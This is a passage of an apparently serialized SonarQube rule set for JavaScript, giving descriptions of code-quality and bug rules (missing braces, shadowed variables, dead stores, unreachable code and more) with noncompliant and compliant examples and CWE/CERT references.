javascriptS26813Multiline blocks should be enclosed in curly braces"MAJOR*js:ê<p>Curly braces can be omitted from a one-line block, such as with an <code>if</code> statement or <code>for</code> loop, but doing so can be
misleading and induce bugs.</p>
<p>This rule raises an issue when the whitespacing of the lines after a one line block indicates an intent to include those lines in the block, but
the omission of curly braces means the lines will be unconditionally executed once.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (condition)
  firstActionInBlock();
  secondAction();  // Noncompliant; executed unconditionally
thirdAction();

if (condition) firstActionInBlock(); secondAction();  // Noncompliant; secondAction executed unconditionally

if (condition) firstActionInBlock();  // Noncompliant
  secondAction();  // Executed unconditionally

if (condition); secondAction();  // Noncompliant; secondAction executed unconditionally

let str = undefined;
for (let i = 0; i &lt; array.length; i++)
  str = array[i];
  doTheThing(str);  // Noncompliant; executed only on last array element
</pre>
<h2>Compliant Solution</h2>
<pre>
if (condition) {
  firstActionInBlock();
  secondAction();
}
thirdAction();

let str = undefined;
for (let i = 0; i &lt; array.length; i++) {
  str = array[i];
  doTheThing(str);
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/3wHEAw">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement
  </li>
</ul>Z
CODE_SMELL
´
javascript:S3531ñ

javascriptS3531#Generators should "yield" something"MAJOR*js:À<p>A generator without a <code>yield</code> statement is at best confusing, and at worst a bug in your code, since the iterator produced by your code
will always be empty. </p>
<h2>Noncompliant Code Example</h2>
<pre>
function* myGen(a, b) {  // Noncompliant
  let answer = 0;
  answer += a * b;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function* myGen(a, b) {
  let answer = 0;
  while (answer &lt; 42) {
    answer += a * b;
    yield answer;
  }
}
</pre>ZBUG
¡
$javascript:DuplicateFunctionArgumentò

javascriptDuplicateFunctionArgument(Function argument names should be unique"MAJOR*js:¥<p>Function arguments should all have different names to prevent any ambiguity. Indeed, if arguments have the same name, the last duplicated argument
hides all the previous arguments with the same name (those previous arguments remain available through arguments[i], so they're not completely
inaccessible).</p>
<p>This hiding makes no sense, reduces understandability and maintainability, and obviously can be error prone. Furthermore, in strict mode, declaring
arguments with the same name produces an error.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function compute(a, a, c) { // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function compute(a, b, c) { // Compliant
}
</pre>ZBUG
†
javascript:S1117ã

javascriptS1117 Variables should not be shadowed"MAJOR*js:º<p>Overriding or shadowing a variable declared in an outer scope can strongly impact the readability, and therefore the maintainability, of a piece of
code. Further, it could lead maintainers to introduce bugs because they think they're using one variable but are really using another.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/c/DCL01-C.+Do+not+reuse+variable+names+in+subscopes">CERT, DCL01-C.</a> - Do not reuse
  variable names in subscopes </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/display/java/DCL51-J.+Do+not+shadow+or+obscure+identifiers+in+subscopes">CERT, DCL51-J.</a> - Do
  not shadow or obscure identifiers in subscopes </li>
</ul>Z
CODE_SMELL
Õ
javascript:S1119∏

javascriptS1119Labels should not be used"MAJOR*js:<p>Labels are not commonly used, and many developers do not understand how they work. Moreover, their usage makes the control flow harder to follow,
which reduces the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
myLabel: {
  let x = doSomething();
  if (x &gt; 0) {
    break myLabel;
  }
  doSomethingElse();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
let x = doSomething();
if (x &lt;= 0) {
  doSomethingElse();
}
</pre>
<h2>Exceptions</h2>
<p>Labeled loops are ignored.</p>Z
CODE_SMELL
û	
javascript:ForInâ	

javascriptForIn?"for...in" loops should filter properties before acting on them"MAJOR*js:¢<p>The <code>for...in</code> statement allows you to loop through the names of all of the properties of an object. The list of properties includes all
those properties that were inherited through the prototype chain. This has the side effect of serving up functions when the interest is in data
properties. Programs that don't take this into account can fail.</p>
<p>Therefore, the body of every <code>for...in</code> statement should be wrapped in an <code>if</code> statement that filters which properties are
acted upon. It can select for a particular type or range of values, or it can exclude functions, or it can exclude properties from the prototype. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (name in object) {
    doSomething(name);  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (name in object) {
  if (object.hasOwnProperty(name)) {
    doSomething(name);
  }
}
</pre>
<h2>Exceptions</h2>
<p>Loops used to clone objects are ignored.</p>
<pre>
for (prop in obj) {
  a[prop] = obj[prop];  // Compliant by exception
}
</pre>ZBUG
π
javascript:S1479§

javascriptS1479;"switch" statements should not have too many "case" clauses"MAJOR*js:∫<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>Z
CODE_SMELL
ª
javascript:S1121¶

javascriptS1121:Assignments should not be made from within sub-expressions"MAJOR*js:Ω<p>Assignments within sub-expressions are hard to spot and therefore make the code less readable. Ideally, sub-expressions should not have
side-effects.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if ((str = cont.substring(pos1, pos2)) != '') { // Noncompliant
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
str = cont.substring(pos1, pos2);
if (str != '') {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/481.html">MITRE, CWE-481</a> - Assigning instead of Comparing </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/nYFtAg">CERT, EXP45-C.</a> - Do not perform assignments in selection statements </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/1gCTAw">CERT, EXP51-J.</a> - Do not perform assignments in conditional expressions
  </li>
</ul>Z
CODE_SMELL
‚

javascript:S2692Õ


javascriptS26923"indexOf" checks should not be for positive numbers"MAJOR*js:Î	<p>Most checks against an <code>indexOf</code> call against a string or array compare it with -1 because 0 is a valid index. Any checks which look for
values &gt;0 ignore the first element, which is likely a bug. If you're merely checking the presence of the string, consider using
<code>includes</code> instead. Before using&nbsp;<code>includes</code> method make sure that your browser version is supporting it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var color = "blue";
var name = "ishmael";
var number = 123;

var arr = [color, name];

if (arr.indexOf("blue") &gt; 0) { // Noncompliant
  // ...
}
if (name.indexOf("ish") &gt; 0) { // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var color = "blue";
var name = "ishmael";
var number = 123;

var arr = [color, name];

if (arr.indexOf("blue") &gt;= 0) {
  // ...
}
if (name.includes("ish")) {
  // ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes">String.prototype.includes()</a>
  documentation at MDN </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/includes">Array.prototype.includes()</a>
  documentation at MDN </li>
</ul>Z
CODE_SMELL
Ú
javascript:S3786›

javascriptS3786ITemplate literal placeholder syntax should not be used in regular strings"MAJOR*js:Ï<p>Template strings allow developers to embed variables or expressions in strings using template literals, instead of string concatenation. This is
done by using expressions like <code>${variable} </code> in a string between two back-ticks (<code>`</code>). However, when used in a regular string
literal (between double or single quotes) the template will not be evaluated and will be used as a literal, which is probably not what was
intended.</p>
<h2>Noncompliant Code Example</h2>
<pre>
console.log("Today is ${date}"); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
console.log(`Today is ${date}`);
</pre>ZBUG
€
javascript:S3782∆

javascriptS3782=Arguments to built-in functions should match documented types"MAJOR*js:⁄<p>The types of the arguments to built-in functions are specified in the JavaScript language specifications. Calls to these functions should conform
to the documented types, otherwise the result will most likely not be what was expected (e.g.: the call would always return <code>false</code>).</p>
<h2>Noncompliant Code Example</h2>
<pre>
const isTooSmall = Math.abs(x &lt; 0.0042);
</pre>
<h2>Compliant Solution</h2>
<pre>
const isTooSmall = Math.abs(x) &lt; 0.0042;
</pre>Z
CODE_SMELL
Ù
javascript:S3358ﬂ

javascriptS3358&Ternary operators should not be nested"MAJOR*js:ä<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function getTitle(p) {
  return p.gender == "male" ? "Mr. " : p.isMarried() ? "Mrs. " : "Miss ";  // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function getTitle(p) {
  if (p.gender == "male") {
    return "Mr. ";
  }
  return p.isMarried() ? "Mrs. " : "Miss ";
}
</pre>Z
CODE_SMELL
≈
javascript:S1854∞

javascriptS1854$Unused assignments should be removed"MAJOR*js:›<p>A dead store happens when a local variable is assigned a value that is not read by any subsequent instruction. Calculating or retrieving a value
only to then overwrite it or throw it away, could indicate a serious error in the code. Even if it's not an error, it is at best a waste of resources.
Therefore all calculated values should be used.</p>
<h2>Noncompliant Code Example</h2>
<pre>
i = a + b; // Noncompliant; calculation result not used before value is overwritten
i = compute();
</pre>
<h2>Compliant Solution</h2>
<pre>
i = a + b;
i += compute();
</pre>
<h2>Exceptions</h2>
<p>This rule ignores initializations to -1, 0, 1, <code>null</code>, <code>undefined</code>, [], {}, <code>true</code>, <code>false</code> and
<code>""</code>. Variables that start with an underscore (e.g. '<code>_unused</code>') are ignored.</p>
<p>This rule also ignores variables declared with object destructuring using rest syntax (used to exclude some properties from object):</p>
<pre>
let {a, b, ...rest} = obj; // 'a' and 'b' are ok
doSomething(rest);

let [x1, x2, x3] = arr;    // but 'x1' is noncompliant, as omitting syntax can be used: "let [, x2, x3] = arr;"
doSomething(x2, x3);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/563.html">MITRE, CWE-563</a> - Assignment to Variable without Use ('Unused Variable') </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/QYA5">CERT, MSC13-C.</a> - Detect and remove unused values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
</ul>Z
CODE_SMELL
	
javascript:S1862€	

javascriptS1862BRelated "if/else if" statements should not have the same condition"MAJOR*js:Ò<p>A chain of <code>if</code>/<code>else if</code> statements is evaluated from top to bottom. At most, only one branch will be executed: the first
one with a condition that evaluates to <code>true</code>.</p>
<p>Therefore, duplicating a condition automatically leads to dead code. Usually, this is due to a copy/paste error. At best, it's simply dead code and
at worst, it's a bug that is likely to induce further bugs as the code is maintained, and obviously it could lead to unexpected behavior.</p>
<p>&nbsp;</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 1)  // Noncompliant
  moveWindowToTheBackground();
</pre>
<h2>Compliant Solution</h2>
<pre>
if (param == 1)
  openWindow();
else if (param == 2)
  closeWindow();
else if (param == 3)
  moveWindowToTheBackground();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
å
javascript:S1066˜

javascriptS1066,Collapsible "if" statements should be merged"MAJOR*js:ú<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x != undefined) {
  if (y === 2) {
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
if (x != undefined &amp;&amp; y === 2) {
  // ...
}
</pre>Z
CODE_SMELL
Ò
javascript:S3003‹

javascriptS30034Comparison operators should not be used with strings"MAJOR*js:˘<p>The use of comparison operators (<code>&lt;</code>, <code>&lt;=</code>, <code>&gt;=</code>, <code>&gt;</code>) with strings is not likely to yield
the expected results. Make sure the intention was to compare strings and not numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var appleNumber = "123";
var orangeNumber = "45";
if (appleNumber &lt; orangeNumber) {  // Noncompliant, this condition is true
  alert("There are more oranges");
}
</pre>
<h2>Compliant Solution</h2>
<pre>
var appleNumber = "123";
var orangeNumber = "45";
if (Number(appleNumber) &lt; Number(orangeNumber)) {
  alert("There are more oranges");
}
</pre>Z
CODE_SMELL
⁄
-javascript:ConstructorFunctionsForSideEffects®

javascript"ConstructorFunctionsForSideEffectsJObjects should not be created to be dropped immediately without being used"MAJOR*js:ô<p>There is no good reason to create a new object to not do anything with it. Most of the time, this is due to a missing piece of code and so could
lead to an unexpected behavior in production.</p>
<p>If it was done on purpose because the constructor has side-effects, then that side-effect code should be moved into a separate method and called
directly.</p>
<h2>Noncompliant Code Example</h2>
<pre>
new MyConstructor(); // Non-Compliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var something = new MyConstructor();  // Compliant
</pre>ZBUG
Ë	
javascript:S2715”	

javascriptS2715F"find" should be used to select the children of an element known by id"MAJOR*js:ﬁ<p>The use of <code>find</code> allows <code>document.getElementById()</code> to be used for the top-level selection, and saves the jQuery Sizzle
engine for where it's really needed. That makes the query faster, and your application more responsive.</p>
<p>From the jQuery documentation:</p>
<blockquote>
  <p>Beginning your selector with an ID is always best.</p>
  <p>The <code>.find()</code> approach is faster because the first selection is handled without going through the Sizzle selector engine ‚Äì ID-only
  selections are handled using <code>document.getElementById()</code>, which is extremely fast because it is native to the browser.</p>
</blockquote>
<h2>Noncompliant Code Example</h2>
<pre>
var $productIds = $("#products div.id"); // Noncompliant - a nested query for Sizzle selector engine
</pre>
<h2>Compliant Solution</h2>
<pre>
var $productIds = $("#products").find("div.id"); // Compliant - #products is already selected by document.getElementById() so only div.id needs to go through Sizzle selector engine
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
ﬂ
javascript:S2716 

javascriptS2716&Universal selectors should not be used"MAJOR*js:ı<p>Element selections that could be matched anywhere in the document can be very slow. That's why use of the universal selector, <code>*</code>,
should be limited; it explicitly specifies that the match could be anywhere.</p>
<h2>Noncompliant Code Example</h2>
<pre>
$( ".buttons &gt; *" );  // Noncompliant; extremely expensive
</pre>
<h2>Compliant Solution</h2>
<pre>
$( ".buttons" ).children(); // Compliant
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
ƒ	
javascript:S3923Ø	

javascriptS3923WAll branches in a conditional structure should not have exactly the same implementation"MAJOR*js:∞<p>Having all branches in a <code>switch</code> or <code>if</code> chain with the same implementation is an error. Either a copy-paste error was made
and something different should be executed, or there shouldn't be a <code>switch</code>/<code>if</code> chain at all.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
if (b == 0) {  // Noncompliant
  doOneMoreThing();
}
else {
  doOneMoreThing();
}

let a = (b == 0) ? getValue() : getValue();   // Noncompliant

switch (i) {  // Noncompliant
  case 1:
    doSomething();
    break;
  case 2:
    doSomething();
    break;
  case 3:
    doSomething();
    break;
  default:
    doSomething();
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not apply to <code>if</code> chains without <code>else</code>-s, or to <code>switch</code>-es without <code>default</code>
clauses.</p>
<pre>
if(b == 0) {    //no issue, this could have been done on purpose to make the code more readable
  doSomething();
} else if(b == 1) {
  doSomething();
}
</pre>ZBUG
©
javascript:S2714î

javascriptS2714>Element type selectors should not be used with class selectors"MAJOR*js:ß<p>Using element type in class selectors is slower than using only the class selector.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var $products = $("div.products");    // Noncompliant - slow
</pre>
<h2>Compliant Solution</h2>
<pre>
var $products = $(".products");    // Compliant - fast
</pre>Z
CODE_SMELL
Ò
javascript:S3800‹

javascriptS3800,Functions should always return the same type"MAJOR*js:Å<p>Unlike strongly typed languages, JavaScript does not enforce a return type on a function. This means that different paths through a function can
return different types of values, which can be very confusing to the user and significantly harder to maintain.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {  // Noncompliant
  if (a === 1) {
    return true;
  }
  return 3;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  if (a === 1) {
    return true;
  }
  return false;
}
</pre>Z
CODE_SMELL
Ô
javascript:S3801⁄

javascriptS3801*Functions should use "return" consistently"MAJOR*js:Å<p>Unlike strongly typed languages, JavaScript does not enforce a return type on a function. This means that different paths through a function can
return different types of values, which can be very confusing to the user and significantly harder to maintain.</p>
<p>In particular a function, in JavaScript, will return <code>undefined</code> in any of the following cases:</p>
<ul>
  <li> It exits without a <code>return</code> statement. </li>
  <li> It executes a <code>return</code> with no value. </li>
</ul>
<p>This rule verifies that return values are either always or never specified for each path through a function.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) { // Noncompliant, function exits without "return"
  if (a == 1) {
    return true;
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo(a) {
  if (a == 1) {
    return true;
  }
  return false;
}
</pre>Z
CODE_SMELL
≤
javascript:S2392ù

javascriptS2392=Variables should be defined in the blocks where they are used"MAJOR*js:±<p>A variable that is declared at function scope, but only used inside a single block should be declared in that block, and variables that are
declared inside a block but used outside of it (which is possible with a <code>var</code>-style declaration) should be declared outside the block.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function doSomething(a, b) {
  var i;  // Noncompliant; should be declared in if-block
  if (a &gt; b) {
    i = a;
    console.log(i);
    var x = a - b;  // Noncompliant; should be declared outside if-block
  }

  if (a &gt; 4) {
   console.log(x);
  }

  return a+b;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function doSomething(a, b) {
  var x = a - b;

  if (a &gt; b) {
    var i = a;
    console.log(i);
  }

  if (a &gt; 4) {
   console.log(x);
  }

  return a+b;
}
</pre>Z
CODE_SMELL
≈
javascript:S3699∞

javascriptS3699EThe output of functions that don't return anything should not be used"MAJOR*js:√<p>If a function does not return anything, it makes no sense to use its output. Specifically, passing it to another function, or assigning its
"result" to a variable is probably a bug because such functions return <code>undefined</code>, which is probably not what was intended.</p>
<p><em>Note that this rule requires Node.js to be available during analysis.</em></p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo() {
  console.log("Hello, World!");
}

a = foo();
</pre>
<h2>Compliant Solution</h2>
<pre>
function foo() {
  console.log("Hello, World!");
}

foo();
</pre>ZBUG
ï
javascript:S3579Ä

javascriptS3579Array indexes should be numeric"MAJOR*js:≤<p>Associative arrays allow you to store values in an array with either numeric or named indexes. But creating and populating an object is just as
easy as an array, and more reliable if you need named members.</p>
<h2>Noncompliant Code Example</h2>
<pre>
let arr = [];
arr[0] = 'a';
arr['name'] = 'bob';  // Noncompliant
arr[1] = 'foo';
</pre>
<h2>Compliant Solution</h2>
<pre>
let obj = {
  name: 'bob',
  arr: ['a', 'foo']
};
</pre>Z
CODE_SMELL
—
javascript:S1154º

javascriptS11546Results of operations on strings should not be ignored"MAJOR*js:ﬁ<p>Doing an operation on a string without using the result of the operation is useless and is certainly due to a misunderstanding. </p>
<h2>Noncompliant Code Example</h2>
<pre>
var str = "..."
str.toUpperCase(); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
var str = "..."
str = str.toUpperCase();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/9gEqAQ">CERT, EXP00-J.</a> - Do not ignore values returned by methods </li>
</ul>
<h2>Deprecated</h2>
<p>This rule is deprecated; use <a href='/coding_rules#rule_key=javascript%3AS2201'>S2201</a> instead.</p>ZBUG
Î
javascript:S2123÷

javascriptS2123*Values should not be uselessly incremented"MAJOR*js:Ñ<p>A value that is incremented or decremented and then not stored is at best wasted code and at worst a bug.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function pickNumber() {
  let i = 0;
  i = i++; // Noncompliant; i is still zero

  return i++; // Noncompliant; 0 returned
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function pickNumber() {
  let i = 0;
  i++;

  return ++i;
}
</pre>ZBUG
Û
javascript:S3696ﬁ

javascriptS3696Literals should not be thrown"MAJOR*js:í<p>It is a bad practice to <code>throw</code> something that's not derived at some level from <code>Error</code>. If you can't find an existing
<code>Error</code> type that suitably conveys what you need to convey, then you should extend <code>Error</code> to create one.</p>
<p>Specifically, part of the point of throwing \<code>Error</code>s is to communicate about the conditions of the error, but literals have far less
ability to communicate meaningfully than \<code>Error</code>s because they don't include stacktraces.</p>
<h2>Noncompliant Code Example</h2>
<pre>
throw 404;                              // Noncompliant
throw "Invalid negative index.";        // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
throw new Error("Status: " + 404);
throw new Error("Invalid negative index.");{code}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 15-1-2 - NULL shall not be thrown explicitly. </li>
</ul>Z
CODE_SMELL
Ã
#javascript:CommentRegularExpression§

javascriptCommentRegularExpression,Track comments matching a regular expression"MAJOR*js:¥<p>This rule template can be used to create rules which will be triggered when a comment matches a given regular expression.</p>
<p>For example, one can create a rule with the regular expression <code>.*REVIEW.*</code> to match all comment containing "REVIEW".</p>
<p>Note that, in order to match REVIEW regardless of the case, the <code>(?i)</code> modifier should be prepended to the expression, as in
<code>(?i).*REVIEW.*</code>.</p>@Z
CODE_SMELL
Æ
javascript:S125ö

javascriptS125,Sections of code should not be commented out"MAJOR*js:¿<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>
<p>Unused code should be deleted and can be retrieved from source control history if required.</p>Z
CODE_SMELL
ô
javascript:UnreachableCode˙


javascriptUnreachableCodeAll code should be reachable"MAJOR*js:¨
<p>Jump statements (<code>return</code>, <code>break</code> and <code>continue</code>) and <code>throw</code> expressions move control flow out of the
current code block. So any statements that come after a jump are dead code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function fun(a) {
  var i = 10;
  return i + a;
  i++;             // Noncompliant; this is never executed
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function fun(int a) {
  var i = 10;
  return i + a;
}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores unreachable <code>break</code> statements in <code>switch</code> clauses.</p>
<pre>
switch (x) {
  case 42:
     return 43;
     break;   // Compliant
  default:
    doSomething();
}
</pre>
<p>Hoisted variables declarations without initialization are always considered reachable.</p>
<pre>
function bar() {
  return x = function() {
    x.foo = 42;
  }
  var x;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/561.html">MITRE, CWE-561</a> - Dead Code </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/uQCSBg">CERT, MSC56-J.</a> - Detect and remove superfluous code and values </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
ì
javascript:S2137˛

javascriptS21373Special identifiers should not be bound or assigned"MAJOR*js:£<p>JavaScript has special identifiers that, while not reserved, still should not be used as identifiers. They include:</p>
<ul>
  <li> <code>eval</code> - evaluates a string as JavaScript code </li>
  <li> <code>arguments</code> - used to access function arguments through indexed properties. </li>
  <li> <code>undefined</code> - returned for values and properties that have not yet been assigned </li>
  <li> <code>NaN</code> - Not a Number; returned when math functions fail. </li>
  <li> <code>Infinity</code> - when a number exceeds the upper limit of the floating point numbers </li>
</ul>
<p> </p>
<p>These words should not be bound or assigned, because doing so would overwrite the original definitions of these identifiers. What's more, assigning
or binding some of these names will generate an error in JavaScript strict mode code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
eval = 17; // Noncompliant
arguments++; // Noncompliant
++eval; // Noncompliant
var obj = { set p(arguments) { } }; // Noncompliant
var eval; // Noncompliant
try { } catch (arguments) { } // Noncompliant
function x(eval) { } // Noncompliant
function arguments() { } // Noncompliant
var y = function eval() { }; // Noncompliant
var f = new Function("arguments", "return 17;"); // Noncompliant

function fun() {
  if (arguments.length == 0) { // Compliant
    // do something
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
result = 17;
args++;
++result;
var obj = { set p(arg) { } };
var result;
try { } catch (args) { }
function x(arg) { }
function args() { }
var y = function fun() { };
var f = new Function("args", "return 17;");

function fun() {
  if (arguments.length == 0) {
    // do something
  }
}
</pre>ZBUG
∆
javascript:S2259±

javascriptS2259PProperties of variables with "null" or "undefined" values should not be accessed"MAJOR*js:π<p>When a variable is assigned an <code>undefined</code> or <code>null</code> value, it has no properties. Trying to access properties of such a
variable anyway results in a <code>TypeError</code>, causing abrupt termination of the script if the error is not caught in a <code>catch</code>
block. But instead of <code>catch</code>-ing this condition, it is best to avoid it altogether.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x === undefined) {
  console.log(x.length); // Noncompliant; TypeError will be thrown
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/476.html">MITRE, CWE-476</a> - NULL Pointer Dereference </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PAw">CERT, EXP34-C.</a> - Do not dereference null pointers </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZwDOAQ">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required
  </li>
</ul>ZBUG
˜
javascript:S2376‚

javascriptS23761Property getters and setters should come in pairs"MAJOR*js:Ç<p>When an object is created with a setter for a property but without a getter for that property, the property is inaccessible and is thus
useless.</p>
<p>This rule also enforces the reverse situation (getter but no setter).</p>
<h2>Noncompliant Code Example</h2>
<pre>
var obj = {
    set foo(value) {
        this.fooval = value;
    }
};
</pre>
<h2>Compliant Solution</h2>
<pre>
var obj = {
    set foo(value) {
        this.fooval = value;
    },
    get foo() {
        return this.fooval;
    }
};
</pre>
<p>or </p>
<pre>
var obj = {
    setFoo(value) {    // a standard method, not a setter
        this.fooval = value;
    }
};
</pre>Z
CODE_SMELL
Í	
javascript:S2814’	

javascriptS28140Variables and functions should not be redeclared"MAJOR*js:ˆ<p>This rule checks that a declaration doesn't use a name that is already in use. Indeed, it is possible to use the same symbol multiple times as
either a variable or a function, but doing so is likely to confuse maintainers. Further it's possible that such reassignments are made in error, with
the developer not realizing that the value of the variable is overwritten by the new assignment.</p>
<p>This rule also applies to function parameters.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var a = 'foo';
function a() {}   // Noncompliant
console.log(a);   // prints "foo"

function myFunc(arg) {
  var arg = "event"; // Noncompliant, argument value is lost
}

fun(); // prints "bar"

function fun() {
  console.log("foo");
}

fun(); // prints "bar"

function fun() {  // Noncompliant
  console.log("bar");
}

fun(); // prints "bar"
</pre>
<h2>Compliant Solution</h2>
<pre>
var a = 'foo';
function otherName() {}
console.log(a);

function myFunc(arg) {
  var newName = "event";
}

fun(); // prints "foo"

function fun() {
  print("foo");
}

fun(); // prints "foo"

function printBar() {
  print("bar");
}

printBar(); // prints "bar"
</pre>Z
CODE_SMELL
È
javascript:S2251‘

javascriptS2251IA "for" loop update clause should move the counter in the right direction"MAJOR*js:„<p>A <code>for</code> loop with a stop condition that can never be reached, such as one with a counter that moves in the wrong direction, will run
infinitely. While there are occasions when an infinite loop is intended, the convention is to construct such loops as <code>while</code> loops. More
typically, an infinite <code>for</code> loop is a bug. </p>
<h2>Noncompliant Code Example</h2>
<pre>
for (var i = 0; i &lt; strings.length; i--) { // Noncompliant;
  //...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
for (var i = 0; i &lt; strings.length; i++) {
  //...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/zYEzAg">CERT, MSC54-J.</a> - Avoid inadvertent wrapping of loop counters </li>
</ul>ZBUG
û
javascript:S138ä

javascriptS1380Functions should not have too many lines of code"MAJOR*js:¨<p>A function that grows too large tends to aggregate too many responsibilities.</p>
<p>Such functions inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller functions which focus on well-defined tasks.</p>
<p>Those smaller functions will not only be easier to understand, but also probably easier to test.</p>
<h2>Exceptions</h2>
<p>This function ignores Immediately Invoked Function Expressions (IIFE), which are functions that are created and invoked without ever being assigned
a name.</p>
<pre>
(function () { // Ignored by this rule

  function open() {  // Classic function declaration; not ignored
    // ...
  }

  function read() {
    // ...
  }

  function readlines() {
    // ...
  }
})();
</pre>Z
CODE_SMELL
ÿ
javascript:ParsingErrorº

javascriptParsingErrorJavaScript parser failure"MAJOR*js:Ì<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the
number of files that do not parse but also to easily find out why they do not parse.</p>Z
CODE_SMELL
≥
javascript:S1656û

javascriptS1656%Variables should not be self-assigned"MAJOR*js:—<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake
and some other value or variable was intended for the assignment instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function setName(name) {
    name = name;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
function setName(name) {
    this.name = name;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>ZBUG
—
javascript:S103Ω

javascriptS103Lines should not be too long"MAJOR*js:t<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>Z
CODE_SMELL
Î
javascript:S905◊

